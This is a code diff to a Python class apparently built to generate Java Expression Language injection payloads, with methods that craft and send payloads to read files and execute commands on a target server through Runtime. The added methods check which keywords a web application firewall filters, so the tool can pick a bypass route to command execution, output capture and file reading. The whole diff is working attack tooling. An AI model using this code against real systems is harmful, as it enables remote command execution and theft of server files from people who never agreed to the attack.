@@ -22,7 +22,7 @@ class GenPayload:
         self.METHODS_INDEX = {}
         self.CONSTRUCTOR_INDEX = {}
 
-        self.GEN_NUM_METHOD = ""
+        self.GEN_NUM_METHOD = "genNumNatural"
         if isOffline:
             self.offlineInit()
         else:
@@ -33,7 +33,7 @@ class GenPayload:
         for key, value in initData.items():
             setattr(self, key, value)
 
-    def chooseNumMethod(self) -> str:
+    def chooseNumMethod(self):
         if utils.checkNoDigits(self.waf):
             return "genNumNatural"
         if all(
@@ -458,7 +458,9 @@ class GenPayload:
         return innerPayload
 
     def read(self, filename):
+        print(f"Generating payload to read file: {filename}")
         innerPayload = self.genReadFile(filename)
+        print(f"Payload: {innerPayload}")
         payload = self.genEL(innerPayload)
         response, result = self.sendPayload(payload)
 
@@ -466,6 +468,56 @@ class GenPayload:
             return "Something went wrong with the payload. Please try again"
 
         return result.replace("\\n", "\n")
+
+    def canExec(self):
+        if not all(
+            element not in ["null", "invoke", "getMethods", "get", "Methods", "()"]
+            for element in self.waf
+        ):
+            return False
+        if not self.FORNAME["Runtime"]:
+            return False
+
+        return True
+
+    def hasOutput(self):
+        if (
+            not self.FORNAME["Scanner"]
+            or not self.CONSTRUCTOR_INDEX["Scanner@InputStream"]
+        ):
+            return False
+        if not all(
+            element
+            not in [
+                "getDeclaredConstructors",
+                "newInstance",
+                "useDelimiter",
+                "next",
+                "()",
+            ]
+            for element in self.waf
+        ):
+            return False
+        return True
+
+    def canRead(self):
+        if not self.FORNAME["Scanner"] or not self.CONSTRUCTOR_INDEX["Scanner@File"]:
+            return False
+        if not self.FORNAME["File"] or not self.CONSTRUCTOR_INDEX["File"]:
+            return False
+        if not all(
+            element
+            not in [
+                "getDeclaredConstructors",
+                "newInstance",
+                "useDelimiter",
+                "next",
+                "()",
+            ]
+            for element in self.waf
+        ):
+            return False
+        return True
 
     def genExecPayload(self, command):
         runTime = self.FORNAME["Runtime"]
@@ -486,7 +538,9 @@ class GenPayload:
         return innerPayload
 
     def exec(self, command):
+        print(f"Geneating payload to execute command: {command}")
         innerPayload = self.genExecPayload(command)
+        print(f"Payload: {innerPayload}")
         payload = self.genEL(innerPayload)
         response, result = self.sendPayload(payload)
 
